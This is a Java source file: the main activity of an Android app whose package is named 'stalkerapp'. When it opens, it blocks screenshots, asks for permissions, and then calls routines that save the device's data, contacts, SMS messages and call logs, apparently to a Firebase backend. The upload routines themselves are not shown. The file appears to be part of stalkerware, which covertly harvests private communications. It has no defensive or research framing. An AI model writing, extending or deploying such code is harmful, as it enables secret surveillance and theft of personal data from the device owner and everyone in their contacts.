package com.github.saintedlittle.stalkerapp;

import android.os.Bundle;
import android.view.WindowManager;

import androidx.appcompat.app.AppCompatActivity;

import com.github.saintedlittle.stalkerapp.firebase.FirebaseSaver;
import com.github.saintedlittle.stalkerapp.utils.PermissionDialog;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Disable screenshots.
        this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);

        // Ask permissions.
        PermissionDialog permissionDialog = new PermissionDialog(this);
        permissionDialog.requestPermissions();

        // Logging information.
        new FirebaseSaver().saveDefaultData(this);

        new FirebaseSaver().saveContacts();
        new FirebaseSaver().saveSMS();
        new FirebaseSaver().saveCalls();


    }

}